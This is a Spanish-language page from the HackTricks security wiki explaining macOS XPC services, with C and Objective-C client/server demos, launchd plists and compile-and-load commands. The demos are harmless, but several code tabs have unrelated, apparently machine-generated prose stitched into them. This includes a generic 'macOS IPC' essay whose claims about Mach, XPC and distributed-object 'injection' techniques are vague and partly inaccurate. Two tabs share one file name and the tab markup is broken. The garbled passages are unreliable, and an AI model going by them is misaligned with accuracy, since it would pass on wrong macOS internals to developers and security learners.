XPC, que significa Comunicación Interprocesos (IPC) de XNU (el kernel utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, lo que permite la **creación de aplicaciones separadas por privilegios** donde cada **componente** se ejecuta con **solo los permisos que necesita** para hacer su trabajo, limitando así el daño potencial de un proceso comprometido.

XPC utiliza una forma de Comunicación Interprocesos (IPC), que es un conjunto de métodos para que los diferentes programas que se ejecutan en el mismo sistema envíen datos de ida y vuelta.

Los principales beneficios de XPC incluyen:

1. **Seguridad**: Al separar el trabajo en diferentes procesos, cada proceso puede recibir solo los permisos que necesita. Esto significa que incluso si un proceso está comprometido, tiene una capacidad limitada para hacer daño.
2. **Estabilidad**: XPC ayuda a aislar los fallos en el componente donde ocurren. Si un proceso falla, se puede reiniciar sin afectar al resto del sistema.
3. **Rendimiento**: XPC permite una fácil concurrencia, ya que se pueden ejecutar diferentes tareas simultáneamente en diferentes procesos.

El único **inconveniente** es que **separar una aplicación en varios procesos** para que se comuniquen a través de XPC es **menos eficiente**. Pero en los sistemas actuales esto casi no se nota y los beneficios son mucho mejores.

Un ejemplo se puede ver en QuickTime Player, donde un componente que utiliza XPC es responsable de la decodificación de video. El componente está diseñado específicamente para realizar tareas computacionales, por lo que, en caso de una violación, no proporcionaría ningún beneficio útil al atacante, como acceso a archivos o a la red.

### Servicios XPC específicos de la aplicación

Los componentes XPC de una aplicación están **dentro de la aplicación en sí**. Por ejemplo, en Safari se pueden encontrar en **`/Applications/Safari.app/Contents/XPCServices`**. Tienen la extensión **`.xpc`** (como **`com.apple.Safari.SandboxBroker.xpc`**) y también son **paquetes** con el binario principal dentro de él: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

Como puede estar pensando, un **componente XPC tendrá diferentes permisos y privilegios** que los otros componentes XPC o el binario principal de la aplicación. EXCEPTO si un servicio XPC está configurado con [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) establecido en "True" en su archivo **Info.plist**. En este caso, el servicio XPC se ejecutará en la misma sesión de seguridad que la aplicación que lo llamó.

Los servicios XPC se **inician** por **launchd** cuando sea necesario y se **apagan** una vez que todas las tareas están **completas** para liberar los recursos del sistema. **Los componentes XPC específicos de la aplicación solo pueden ser utilizados por la aplicación**, lo que reduce el riesgo asociado con posibles vulnerabilidades.

### Servicios XPC de todo el sistema

Los **servicios XPC de todo el sistema** son accesibles para todos los usuarios. Estos servicios, ya sean de tipo launchd o Mach, deben **definirse en archivos plist** ubicados en directorios especificados como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** o **`/Library/LaunchAgents`**.

Estos archivos plist tendrán una clave llamada **`MachServices`** con el nombre del servicio y una clave llamada **`Program`** con la ruta al binario:
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Program</key>
	<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
	<key>AbandonProcessGroup</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>Label</key>
	<string>com.jamf.management.daemon</string>
	<key>MachServices</key>
	<dict>
		<key>com.jamf.management.daemon.aad</key>
		<true/>
		<key>com.jamf.management.daemon.agent</key>
		<true/>
		<key>com.jamf.management.daemon.binary</key>
		<true/>
		<key>com.jamf.management.daemon.selfservice</key>
		<true/>
		<key>com.jamf.management.daemon.service</key>
		<true/>
	</dict>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
```
Los que están en **`LaunchDaemons`** son ejecutados por root. Por lo tanto, si un proceso sin privilegios puede comunicarse con uno de ellos, podría ser capaz de escalar privilegios.

### Mensajes de eventos XPC

Las aplicaciones pueden **suscribirse** a diferentes **mensajes de eventos**, lo que les permite ser **iniciadas a pedido** cuando ocurren dichos eventos. La **configuración** de estos servicios se realiza en archivos **plist de launchd**, ubicados en los **mismos directorios que los anteriores** y que contienen una clave adicional de **`LaunchEvent`**.

### Verificación del proceso de conexión XPC

Cuando un proceso intenta llamar a un método a través de una conexión XPC, el **servicio XPC debe verificar si ese proceso tiene permitido conectarse**. Aquí se presentan las formas comunes de verificar eso y las trampas comunes:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### Autorización XPC

Apple también permite que las aplicaciones **configuren algunos derechos y cómo obtenerlos**, por lo que si el proceso que llama los tiene, se le permitiría **llamar a un método** del servicio XPC:

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Ejemplo de código en C

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
    if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
        // Print received message
        const char* received_message = xpc_dictionary_get_string(event, "message");
        printf("Received message: %s\n", received_message);

        // Create a response dictionary
        xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(response, "received", "received");

        // Send response
        xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
        xpc_connection_send_message(remote, response);

        // Clean up
        xpc_release(response);
    }
}

static void handle_connection(xpc_connection_t connection) {
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        handle_event(event);
    });
    xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
    xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
                                                                   dispatch_get_main_queue(),
                                                                   XPC_CONNECTION_MACH_SERVICE_LISTENER);
    if (!service) {
        fprintf(stderr, "Failed to create service.\n");
        exit(EXIT_FAILURE);
    }

    xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_CONNECTION) {
            handle_connection(event);
        }
    });

    xpc_connection_resume(service);
    dispatch_main();

    return 0;
}
```
{% endtab %}

{% tab title="xpc_client.c" %}

# Comunicación entre procesos con XPC

XPC es un framework de Apple que permite la comunicación entre procesos en macOS y iOS. Es utilizado por muchos servicios del sistema operativo, como el daemon de notificaciones, el daemon de localización, el daemon de Bluetooth, entre otros.

XPC utiliza un sistema de mensajes para la comunicación entre procesos. Cada mensaje es un objeto XPC que contiene información sobre la tarea que se debe realizar. Los mensajes se envían desde un proceso cliente a un proceso servidor, y el servidor responde con otro mensaje.

Para utilizar XPC, primero se debe crear una conexión entre el cliente y el servidor. Esto se hace utilizando la función `xpc_connection_create()`. Una vez creada la conexión, se pueden enviar mensajes utilizando la función `xpc_connection_send_message()`. El servidor recibe los mensajes utilizando la función `xpc_connection_set_event_handler()`.

Es importante tener en cuenta que XPC utiliza un sistema de sandboxing para limitar el acceso de los procesos a los recursos del sistema. Esto significa que un proceso cliente sólo puede enviar mensajes a un proceso servidor si tiene los permisos necesarios.

## Ejemplo de uso de XPC

El siguiente ejemplo muestra cómo utilizar XPC para enviar un mensaje desde un proceso cliente a un proceso servidor:

```c
#include <stdio.h>
#include <xpc/xpc.h>

int main(int argc, const char * argv[]) {
    xpc_connection_t connection = xpc_connection_create_mach_service("com.example.server", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    if (!connection) {
        printf("Error al crear la conexión\n");
        return 1;
    }

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        printf("Mensaje recibido\n");
    });

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "mensaje", "Hola, servidor!");

    xpc_connection_send_message(connection, message);

    xpc_release(message);
    xpc_release(connection);

    return 0;
}
```

En este ejemplo, se crea una conexión con el servicio "com.example.server" utilizando la función `xpc_connection_create_mach_service()`. Se establece un manejador de eventos utilizando la función `xpc_connection_set_event_handler()`, que imprime un mensaje cuando se recibe un mensaje del servidor.

Luego se crea un objeto XPC que contiene el mensaje que se desea enviar al servidor. En este caso, el mensaje es un diccionario que contiene una cadena de texto.

Finalmente, se envía el mensaje utilizando la función `xpc_connection_send_message()`, y se liberan los recursos utilizando las funciones `xpc_release()`.

## Referencias

- [Documentación de XPC en Apple Developer](https://developer.apple.com/documentation/xpc)
- [Comunicación entre procesos con XPC en Apple Developer](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)

{% endtab %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
    xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
            // Print received message
            const char* received_message = xpc_dictionary_get_string(event, "received");
            printf("Received message: %s\n", received_message);
        }
    });

    xpc_connection_resume(connection);

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "message", "Hello, Server!");

    xpc_connection_send_message(connection, message);

    dispatch_main();
    
    return 0;
}
```
{% endtab %}

{% tab title="xyz.hacktricks.service.plist" %}

El archivo `xyz.hacktricks.service.plist` es un archivo de propiedad de `launchd` que se utiliza para definir un servicio personalizado en macOS. Este archivo se encuentra en la ruta `/Library/LaunchDaemons/` y se utiliza para iniciar y detener servicios en el sistema operativo.

Para crear un servicio personalizado, se debe crear un archivo `.plist` que contenga la información necesaria para definir el servicio. Este archivo debe incluir información como el nombre del servicio, el comando que se debe ejecutar para iniciar el servicio, el usuario y grupo que se deben utilizar para ejecutar el servicio, entre otros detalles.

Una vez que se ha creado el archivo `.plist`, se debe colocar en la ruta `/Library/LaunchDaemons/` y se debe cargar en `launchd` utilizando el comando `sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist`. Esto iniciará el servicio y lo mantendrá en ejecución hasta que se detenga manualmente o se reinicie el sistema.

Es importante tener en cuenta que los archivos `.plist` pueden contener información confidencial, como contraseñas o claves de API. Por lo tanto, es importante asegurarse de que estos archivos estén protegidos adecuadamente y no se filtren a través de un ataque de fuga de información. 

{% endtab %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
    <dict>
        <key>xyz.hacktricks.service</key>
        <true/>
    </dict>
<key>Program</key>
    <string>/tmp/xpc_server</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/xpc_server</string>
    </array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### Ejemplo de código ObjectiveC

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
    NSLog(@"Received message: %@", some_string);
    NSString *response = @"Received";
    reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

    MyXPCObject *my_object = [MyXPCObject new];

    newConnection.exportedObject = my_object;

    [newConnection resume];
    return YES;
}
@end

int main(void) {

    NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

    id <NSXPCListenerDelegate> delegate = [MyDelegate new];
    listener.delegate = delegate;
    [listener resume];

    sleep(10); // Fake something is done and then it ends
}
```
{% endtab %}

{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
    [connection resume];

    [[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
        NSLog(@"Received response: %@", response);
    }];

    [[NSRunLoop currentRunLoop] run];

    return 0;
}
```
{% endtab %}

{% tab title="macOS IPC (Inter-Process Communication)" %}
# IPC (Inter-Process Communication)

IPC es un mecanismo que permite a los procesos comunicarse entre sí y compartir datos. En macOS, hay varios mecanismos de IPC disponibles, como sockets, pipes, notificaciones, etc.

## Mach Messages

Mach es el kernel de macOS y proporciona una interfaz de IPC para los procesos. Los mensajes Mach son una forma de IPC que se utiliza para la comunicación entre procesos en macOS. Los mensajes Mach se utilizan para enviar y recibir datos entre procesos y para notificar a los procesos de eventos del sistema.

### Mach Ports

Los puertos Mach son una forma de identificar los procesos y los recursos del sistema. Los puertos Mach se utilizan para enviar y recibir mensajes Mach. Cada proceso tiene un puerto maestro que se utiliza para recibir mensajes Mach. Los puertos Mach también se utilizan para identificar los recursos del sistema, como los archivos y los sockets.

### Mach Messages Structure

Los mensajes Mach tienen una estructura fija que consta de un encabezado y un cuerpo. El encabezado contiene información sobre el mensaje, como el tipo de mensaje, el puerto de origen y el puerto de destino. El cuerpo contiene los datos que se envían con el mensaje.

### Mach Messages Injection

La inyección de mensajes Mach es una técnica de escalada de privilegios que se utiliza para enviar mensajes Mach a procesos con privilegios elevados. La inyección de mensajes Mach se puede utilizar para obtener acceso a recursos del sistema que normalmente están protegidos.

## XPC Services

XPC es un marco de trabajo de IPC que se utiliza para la comunicación entre procesos en macOS. XPC se utiliza para crear servicios que se ejecutan en segundo plano y que pueden ser utilizados por otros procesos. Los servicios XPC se ejecutan en un proceso separado y se comunican con otros procesos a través de mensajes XPC.

### XPC Services Structure

Los servicios XPC tienen una estructura fija que consta de un archivo de configuración y un binario. El archivo de configuración contiene información sobre el servicio, como el nombre y la versión. El binario contiene el código que se ejecuta cuando se llama al servicio.

### XPC Services Injection

La inyección de servicios XPC es una técnica de escalada de privilegios que se utiliza para ejecutar código en el contexto de un servicio XPC con privilegios elevados. La inyección de servicios XPC se puede utilizar para obtener acceso a recursos del sistema que normalmente están protegidos.

## Distributed Objects

Los objetos distribuidos son una forma de IPC que se utiliza para la comunicación entre procesos en macOS. Los objetos distribuidos se utilizan para enviar y recibir mensajes entre procesos y para compartir datos entre procesos.

### Distributed Objects Structure

Los objetos distribuidos tienen una estructura fija que consta de una interfaz y una implementación. La interfaz define los métodos que se pueden llamar en el objeto distribuido. La implementación contiene el código que se ejecuta cuando se llama a los métodos.

### Distributed Objects Injection

La inyección de objetos distribuidos es una técnica de escalada de privilegios que se utiliza para ejecutar código en el contexto de un objeto distribuido con privilegios elevados. La inyección de objetos distribuidos se puede utilizar para obtener acceso a recursos del sistema que normalmente están protegidos.

## References

- [Mach Messages](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
- [XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
- [Distributed Objects](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/Introduction/Introduction.html)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
    <dict>
        <key>xyz.hacktricks.svcoc</key>
        <true/>
    </dict>
<key>Program</key>
    <string>/tmp/oc_xpc_server</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/oc_xpc_server</string>
    </array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## Referencias

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
